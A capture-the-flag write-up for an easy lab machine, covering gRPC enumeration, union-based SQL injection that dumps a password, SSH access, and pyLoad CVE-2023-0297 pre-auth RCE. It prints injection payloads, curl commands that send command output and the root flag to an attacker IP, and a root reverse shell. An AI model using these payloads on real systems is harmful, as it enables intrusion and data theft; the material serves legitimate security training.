# Sau

## Information about the box

- Difficulty: easy
- Points: 20

## Discovery

For discovery, I used the following `nmap` configuration:

```
$ nmap -v -Pn -oN nmap/nmap -A -T5 -p- 10.10.11.214
```

- `-v` - Verbose mode.
- `-Pn` - Ignore ping, assume host is alive.
- `-oN` - Normal output to file.
- `-A` - Equivalent to `-sC -sV -O`.
- `-T5` - Very fast scan.
- `-p-` - Scan all 65535 ports.

After waiting 114 seconds, I got the following output:

```
# Nmap 7.94 scan initiated Tue Aug 29 17:16:51 2023 as: nmap -v -Pn -oN nmap/nmap -A -T5 -p- 10.10.11.214
Nmap scan report for 10.10.11.214
Host is up (0.060s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.94%I=7%D=8/29%Time=64EE1A5C%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 29 17:18:45 2023 -- 1 IP address (1 host up) scanned in 114.07 seconds
```

We can see here that there are 2 services running on the machine:
- OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
- An unknown service

### The mysterious service on port 50051

At first, I did not know what service runs on this port, but after a bit of digging I have found a clue while searching the first couple of bytes, an example search: 

```
"00 00 18 04 00" port 50051
```

This lead me to think this is a gRPC server. I installed `grpcurl` and tried to check if there is `server reflection`, which is a way to inform the user what services are running and what methods are supported without having to use a custom-built client (I think it is used mainly for debugging purposes). After using the following commands, I got the following juicy info:

```
$ grpcurl -plaintext 10.10.11.214:50051 list

SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

```
$ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp

SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

When searching about gRPC pentesting/hacking/exploits I found [this article](https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9) which helped a lot. Not only I discovered `grpcurl`, but also `grpcui`, which creates a web server which you can attach to the exposed gRPC service (Server reflection must be enabled in order for this to work though).

After starting `grpcui -plaintext 10.10.11.214:50051`, I created an account using `SimpleApp.RegisterUser` and logged in with the newly created account using `SimpleApp.LoginUser`. I got a `JWT` token after logging in, so I used `jwt-cracker -t <JWT>` to try to crack it.

### Exploitation

While the JWT token was in the process of cracking, I played with the API a bit and found what at first looked like boolean-based SQL injection in the `SimpleApp.getInfo` endpoint:

```
{
    "id": "0 OR id=661"
}

Returned:

{
    "message": "Will update soon."
}
```

But when playing with this vulnerability more, I discovered this is also a union-based SQL injection:

```
{
    "id": "0 UNION SELECT 1"
}

Returned:

{
    "message": "1"
}
```

### And the fun begins!

I have extracted the list of tables using the following payload:

```
{
    "id": "0 UNION SELECT GROUP_CONCAT(name,\";\") FROM sqlite_master"
}

Returned:

{
    "message": "accounts;sqlite_autoindex_accounts_1;messages;sqlite_autoindex_messages_1;sqlite_autoindex_messages_2"
}
```

Then, I extracted the structure of the `accounts` table:

```
{
    "id": "0 UNION SELECT sql FROM sqlite_master WHERE name=\"accounts\""
}

Returned:

{
    "message": "CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)"
}
```

The next thing I done is:

```
{
    "id": "0 UNION SELECT GROUP_CONCAT(username,\";\") FROM accounts"
}

{
    "message": "admin;sau"
}


{
    "id": "0 UNION SELECT GROUP_CONCAT(password,\";\") FROM accounts"
}

{
    "message": "admin;HereIsYourPassWord1431"
}
```

We have a password! The very next thing I done is try login to SSH using the newly obtained credentials:

```
$ ssh sau@10.10.11.214

sau@pc:~$ 
```

We got a shell!

### User Flag

The user flag was found in the `/home/sau` folder using the SSH credentials.


### A service on port 9666 and 8000?

After doing a bit of enumeration on the machine, I've discovered that there are two additional services running, which could by run by `root`:

- `0.0.0.0:9666` - A PyLoad instance. Not available from the outside, I assumed that the firewall was blocking the incoming requests.
- `localhost:8000` - Another PyLoad instance.

To access the pyload page, I used the following command on the attacker machine (SSH tunneling):

```
$ ssh sau@10.10.11.214 -N -L 9666:127.0.0.1:8000
```

- `-N` - Run in background.
- `-L <local_port>:<remote_ip>:<remote_port>` - Tunnel a service through SSH.

I was able to access the pyload instance using this method.

I could not find the version of the pyload instance via the webpage, but I found a way using the command `pip list` to list all the packages installed.

### Root Flag

After searching for `pyload exploit` in google, I found this CVE - [CVE-2023-0297](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad), which is a pre-auth RCE vulnerability existing in versions earlier than `0.5.0b3.dev31`.

To test the vulnerability, I opened burpsuite and used the following payload with `nc -lvp 9999` running in another terminal:

Request:
```
POST /flash/addcrypted2 HTTP/1.1
Host: localhost:9666
User-Agent: ...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Origin: http://localhost:9666
Connection: close
Referer: http://localhost:9666/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

jk=pyimport%20os;os.system("curl+http%3a//10.10.16.85%3a9999/$(whoami)");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

Response in `nc -lvp 9999`:
```
GET /root HTTP/1.1
Host: 10.10.16.85:9999
User-Agent: curl/7.68.0
Accept: */*
```

Success! We get an echo back from the `root` process. I used the following technique to extract information, and finally the `root` flag from the server:

```
POST /flash/addcrypted2 HTTP/1.1
Host: localhost:9666
User-Agent: ...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Origin: http://localhost:9666
Connection: close
Referer: http://localhost:9666/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

jk=pyimport%20os;os.system("curl+-d+\"$(ls+-la)\"+http%3a//10.10.16.85%3a9999/");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

```
POST / HTTP/1.1
Host: 10.10.16.85:9999
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 202
Content-Type: application/x-www-form-urlencoded

total 44
drwxr-xr-x 2 root root  4096 Aug 31 15:47 .
drwxr-xr-x 7 root root  4096 Jan 11  2023 ..
-rw-r--r-- 1 root root     1 Jan 11  2023 db.version
-rw------- 1 root root 28672 Aug 31 15:47 pyload.db
```

After further enumeration, I got the flag using the following payload:

```
jk=pyimport%20os;os.system("curl+-d+\"$(cat+/root/root.txt)\"+http%3a//10.10.16.85%3a9999/");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

But I didn't feel satisfied, I NEED TO POP A SHELL!

The next thing I've done is create a reverse shell python file inside `/tmp/nora/revshell.py` using the `sau` account and sent the following request to the server:

```
jk=pyimport%20os;os.system("/tmp/nora/rev.py");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

```
$ nv -lvp 9999
listening on [any] 9999 ...
10.10.11.214: inverse host lookup failed: Unknown host
connect to [10.10.16.85] from (UNKNOWN) [10.10.11.214] 43674
# whoami
whoami
root
# 
```